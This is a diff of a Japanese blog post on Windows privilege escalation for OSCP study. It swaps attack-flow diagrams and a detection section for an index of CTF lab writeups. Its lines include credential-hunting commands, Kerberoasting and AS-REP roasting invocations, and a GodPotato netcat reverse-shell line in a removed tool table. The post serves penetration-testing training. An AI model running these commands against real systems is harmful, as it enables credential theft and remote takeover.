+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+schtasks /query /fo LIST /v
 cmdkey /list
-findstr /si password *.txt *.xml *.ini *.config
 Get-Content C:\Windows\Panther\Unattend\Unattended.xml
-
-# ── スケジュールタスク ──
-schtasks /query /fo LIST /v | findstr /i "task\|run as\|status"
-
-# ── 自動列挙 ──
+findstr /si password *.txt *.xml *.ini *.config
 .\winPEASx64.exe
 ```
 
 ---
 
-## 攻撃パターン別フロー
+## Writeup 参照インデックス — 全網羅
 
-### パターン A — Web サービス → トークン悪用 → SYSTEM
+### Proving Grounds（OSCP 最優先）
 
-```mermaid
-flowchart LR
-    A[Web / Jenkins / IIS へのアクセス] --> B[RCE → 低権限シェル]
-    B --> C[whoami /priv → SeImpersonatePrivilege]
-    C --> D[GodPotato / PrintSpoofer 実行]
-    D --> E[SYSTEM シェル]
-```
-*代表事例: THM Alfred・THM HackPark・THM Steel Mountain*
+| マシン | 実際の OS | 侵入経路 | 権限昇格 | リンク |
+|--------|-----------|----------|---------|-------|
+| **Craft2** | Windows 10 | Bad-ODF NTLM → Web シェル | CVE-2020-1337（WerTrigger + DLL） | [→](/posts/pg-craft2/) |
+| **Apex** | Linux（Ubuntu） | OpenEMR LFI（CVE-2018-17179） | sqlconf.php → MySQL 資格情報 | [→](/posts/pg-apex/) |
+| **Bratarina** | Linux（Samba） | OpenSMTPD RCE（CVE-2020-7247） | エクスプロイトで直接 root | [→](/posts/pg-bratarina/) |
+| **Clue** | Linux（Debian） | Cassandra Web LFI → FreeSWITCH RCE | sudo → root として LFI 再利用 | [→](/posts/pg-clue/) |
 
-### パターン B — ドメインユーザー → Kerberoasting → Domain Admin
+### HackTheBox Windows
 
-```mermaid
-flowchart LR
-    A[初期侵入 - ドメインユーザーシェル] --> B[GetUserSPNs.py で TGS 取得]
-    B --> C[hashcat -m 13100 でクラック]
-    C --> D[高権限サービス / 管理者アカウント取得]
-    D --> E[psexec.py / evil-winrm → Domain Admin]
-```
-*代表事例: HTB Active・THM Corp*
+| マシン | 侵入経路 | 権限昇格 | リンク |
+|--------|----------|---------|-------|
+| **Active** | SMB null → GPP cpassword | Kerberoasting → Domain Admin | [→](/posts/htb-active/) |
+| **Forest** | LDAP ユーザー列挙 | AS-REP Roast → BloodHound → DCSync | [→](/posts/htb-forest/) |
+| **Fluffy** | （Writeup 参照） | （Writeup 参照） | [→](/posts/htb-fluffy/) |
+| **Legacy** | （Writeup 参照） | （Writeup 参照） | [→](/posts/htb-legacy/) |
 
-### パターン C — 匿名 SMB → 資格情報露出 → 管理者
+### TryHackMe Windows（主要マシン）
 
-```mermaid
-flowchart LR
-    A[SMB 匿名セッション] --> B[Groups.xml / Unattend.xml 発見]
-    B --> C[cpassword 復号 / Base64 デコード]
-    C --> D[ドメイン資格情報取得]
-    D --> E[Kerberoast または直接 Admin 接続]
-```
-*代表事例: HTB Active（GPP）・THM Corp（Unattend.xml）*
+| マシン | 侵入経路 | 権限昇格 | リンク |
+|--------|----------|---------|-------|
+| **Windows PrivEsc** | ローカルシェル | 書き込み可スクリプト + SYSTEM スケジューラー | [→](/posts/thm-windows-privesc/) |
+| **Windows PrivEsc Arena** | RDP | サービス設定不備・AlwaysInstallElevated・引用符なしパス | [→](/posts/thm-windows-privesc-arena/) |
+| **Alfred** | Jenkins デフォルト認証 | SeImpersonate → PrintSpoofer | [→](/posts/thm-alfred/) |
+| **Corp** | ローカル RDP | Kerberoasting + Unattend.xml | [→](/posts/thm-corp/) |
+| **Retro** | WordPress 資格情報 → RDP | カーネルエクスプロイト | [→](/posts/thm-retro/) |
+| **Steel Mountain** | Rejetto HFS CVE | サービス設定悪用 | [→](/posts/thm-steel-mountain/) |
+| **HackPark** | Web ブルートフォース | （Writeup 参照） | [→](/posts/thm-hackpark/) |
+| **Blaster** | （Writeup 参照） | （Writeup 参照） | [→](/posts/thm-blaster/) |
+| **Holo** | （Writeup 参照） | （Writeup 参照） | [→](/posts/thm-holo/) |
+| **Stealth** | （Writeup 参照） | （Writeup 参照） | [→](/posts/thm-stealth/) |
+| **Attacking Kerberos** | Kerberos 攻撃 | AD ラボ | [→](/posts/thm-attacking-kerberos/) |
+| **Attacktive Directory** | AD ラボ | AD ラボ | [→](/posts/thm-attacktive-directory/) |
 
-### パターン D — AS-REP Roast → BloodHound → DCSync
+### 関連 TechBlog 記事
 
-```mermaid
-flowchart LR
-    A[LDAP / enum4linux でユーザー列挙] --> B[AS-REP Roast で事前認証なしアカウント特定]
-    B --> C[ハッシュクラック → サービスアカウント侵害]
-    C --> D[BloodHound で ACL パス分析]
-    D --> E[WriteDACL / GenericAll 悪用]
-    E --> F[DCSync → 全ハッシュ取得 → Domain Admin]
-```
-*代表事例: HTB Forest*
-
----
-
-## ツールリファレンス
-
-| ツール | 用途 | 主要コマンド |
-|--------|------|-------------|
-| **winPEAS** | ローカル列挙 | `.\winPEASx64.exe` |
-| **GodPotato** | SeImpersonate → SYSTEM | `.\GodPotato.exe -cmd "nc.exe $IP 4444 -e cmd"` |
-| **PrintSpoofer** | SeImpersonate → SYSTEM | `.\PrintSpoofer64.exe -i -c cmd` |
-| **accesschk.exe** | サービス / ファイル ACL 確認 | `accesschk.exe /accepteula -uwcqv "Users" *` |
-| **GetUserSPNs.py** | Kerberoasting | `python3 GetUserSPNs.py -request -dc-ip $ip DOMAIN/user:pass` |
-| **GetNPUsers.py** | AS-REP Roasting | `python3 GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt` |
-| **BloodHound** | AD ACL パスマッピング | `bloodhound-python -d DOMAIN -u user -p pass -c All` |
-| **evil-winrm** | WinRM シェル | `evil-winrm -i $ip -u user -p pass` |
-| **hashcat** | オフラインハッシュクラック | `-m 13100`（Kerberoast）, `-m 18200`（AS-REP）, `-m 5600`（NetNTLMv2） |
-| **responder** | NTLM キャプチャ | `sudo responder -I tun0 -v` |
-| **gpp-decrypt** | GPP cpassword 復号 | `gpp-decrypt "<cpassword>"` |
-| **msfvenom** | ペイロード生成 | `-f msi`, `-f dll`, `-f exe` |
+| 記事 | リンク |
+|------|-------|
+| Windows Potato PrivEsc ガイド（GodPotato ～ Hot Potato 全解説） | [→](/posts/tech-windows-potato-privesc/) |
+| PsExec ラテラルムーブメント | [→](/posts/tech-psexec-lateral-movement/) |
+| NTLM リレー（ntlmrelayx） | [→](/posts/tech-ntlmrelayx-attack-guide/) |
+| Kerberoasting（GetUserSPNs 詳解） | [→](/posts/tech-getuserspns-kerberoasting/) |
+| RBCD 攻撃 | [→](/posts/tech-rbcd-attack-guide/) |
+| AD CS / Certipy | [→](/posts/tech-certipy-adcs-attack/) |
 
 ---
 
-## 検知とブルーチームへの対策
+## OSCP 受験者への5つの教訓
 
-### 監視すべき Windows イベント ID
+1. **バナー確認 → searchsploit が最初のアクション。** Bratarina は `nc $ip 25` でバージョン確認 → searchsploit → 公開エクスプロイト実行という3ステップで解決した。OSCP 本番でも同じパターンが頻出する。
 
-| イベント ID | 説明 | 関連手法 |
-|------------|------|---------|
-| 4648 | 明示的な資格情報によるログオン | トークン悪用・ラテラルムーブメント |
-| 4672 | ログオン時に特権付与 | SeImpersonate 悪用 |
-| 4688 | プロセス作成 | サービスアカウントから cmd.exe / powershell.exe が起動 |
-| 4769 | Kerberos サービスチケットリクエスト | Kerberoasting（RC4 ダウングレード = `0x17`） |
-| 4768 | Kerberos AS リクエスト | AS-REP Roasting（事前認証なし） |
-| 7045 | 新規サービスインストール | 永続化 / 権限昇格 |
+2. **LFI は `/etc/passwd` だけではない。** Clue と Apex は `/proc/self/cmdline`・アプリ設定ファイル・サービス設定への LFI が資格情報を直接抽出できることを示している。
 
-### 緩和策
+3. **chisel によるポートフォワードは必須スキル。** Craft2 では標的内部の MySQL を Kali から見えるようにするために chisel が必要だった。`server/client` の構文とリバースポートフォワードの記法を暗記しておくこと。
 
-```powershell
-# 1. 不要な SeImpersonatePrivilege の削除
-#    サービスアカウントには gMSA または仮想サービスアカウントを使用する
+4. **Responder は Windows 攻撃の「開幕手」として有効。** ファイルを取得させられる Windows ホストは必ず NTLMv2 を漏洩する。Craft2 は ODF ドキュメントがそのトリガーになった。
 
-# 2. 全アカウントに Kerberos 事前認証を要求
-#    （AS-REP Roasting の攻撃面を排除）
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADAccountControl -DoesNotRequirePreAuth $false
-
-# 3. サービスアカウントに強力でユニークなパスワードを設定（25 文字以上）
-#    定期ローテーションと TGS リクエストの RC4 ダウングレード監視
-
-# 4. スケジュールタスク / サービス設定の書き込み可能パスを監査
-icacls "C:\path\to\script.ps1"
-
-# 5. AlwaysInstallElevated を無効化
-reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
-reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
-```
-
----
-
-## Writeup 参照インデックス
-
-| Writeup | プラットフォーム | 主な権限昇格手法 | リンク |
-|---------|----------------|----------------|-------|
-| Windows PrivEsc | TryHackMe | 書き込み可能スクリプト + スケジュールタスク → SYSTEM | [→](/posts/thm-windows-privesc/) |
-| Windows PrivEsc Arena | TryHackMe | サービス設定不備・AlwaysInstallElevated・引用符なしパス | [→](/posts/thm-windows-privesc-arena/) |
-| Alfred | TryHackMe | Jenkins 弱認証 → SeImpersonate → PrintSpoofer | [→](/posts/thm-alfred/) |
-| Corp | TryHackMe | Kerberoasting → Unattend.xml 保存資格情報 | [→](/posts/thm-corp/) |
-| Retro | TryHackMe | WordPress 資格情報再利用 → RDP → カーネルエクスプロイト | [→](/posts/thm-retro/) |
-| Steel Mountain | TryHackMe | Rejetto HFS CVE → サービス設定悪用 | [→](/posts/thm-steel-mountain/) |
-| Active | HackTheBox | SMB null → GPP cpassword → Kerberoasting → Domain Admin | [→](/posts/htb-active/) |
-| Forest | HackTheBox | enum4linux → AS-REP Roast → BloodHound → DCSync | [→](/posts/htb-forest/) |
-| Craft2 | Proving Grounds | Bad-ODF NTLM キャプチャ → CVE-2020-1337 → SYSTEM | [→](/posts/pg-craft2/) |
-| Potato PrivEsc ガイド | TechBlog | Potato 系全ツールリファレンス（GodPotato ～ Hot Potato） | [→](/posts/tech-windows-potato-privesc/) |
-
----
-
-## まとめ — 実践で使える 5 つの教訓
-
-1. **まず `whoami /priv` を確認する。**
-   SeImpersonatePrivilege は Web / DB サービスが動く Windows ホストで最も信頼性の高い SYSTEM 到達パス。IIS や SQL Server を侵害したら真っ先に確認すること。
-
-2. **AD 環境では SPN 列挙を最優先で行う。**
-   サービスアカウントに SPN が付いており、かつパスワードが弱い場合、Kerberoasting で資格情報を入手でき、それがドメイン内で再利用されているケースが多い。
-
-3. **SMB 匿名アクセスと SYSVOL は高価値ターゲット。**
-   `Groups.xml` の GPP cpassword や `Unattend.xml` の資格情報は、数年経っても放置されていることがある。初期列挙で見落とさないようにすること。
-
-4. **winPEAS + BloodHound が標準ツールキット。**
-   winPEAS はローカル設定不備を網羅し、BloodHound は AD の攻撃面をマップする。初期侵入直後に両方を実行するのが最効率。
-
-5. **スケジュールタスクとサービスは「実行コンテキスト」で評価する。**
-   書き込み可能なファイルそのものに価値はなく、「特権アカウントで実行されるか」「どの頻度でトリガーされるか」を確認してから利用可否を判断すること。
+5. **Web / DB サービスのシェルは SeImpersonatePrivilege を持つことが多い。** IIS・XAMPP（apache）・Jenkins・SQL Server のシェルを取ったら、最初に必ず `whoami /priv` を確認する。GodPotato は Server 2012 から Windows 11 まで全対応している。
 
 ---
 
 ## 参照リンク
 
-- [TryHackMe - Windows PrivEsc](https://tryhackme.com/room/windows10privesc)
-- [TryHackMe - Windows PrivEsc Arena](https://tryhackme.com/room/windowsprivesc20)
-- [Windows Potato PrivEsc（本ブログ）](/posts/tech-windows-potato-privesc/)
 - [Potatoes Windows Privesc — Jorge Lajara](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
 - [GodPotato](https://github.com/BeichenDream/GodPotato)
 - [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
@@ -525,3 +536,7 @@ reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEleva
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 - [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 - [Impacket](https://github.com/fortra/impacket)
+- [chisel](https://github.com/jpillora/chisel)
+- [CVE-2020-7247（OpenSMTPD）](https://nvd.nist.gov/vuln/detail/CVE-2020-7247)
+- [CVE-2020-1337（WerTrigger）](https://nvd.nist.gov/vuln/detail/CVE-2020-1337)
+- [CVE-2018-17179（OpenEMR）](https://nvd.nist.gov/vuln/detail/CVE-2018-17179)
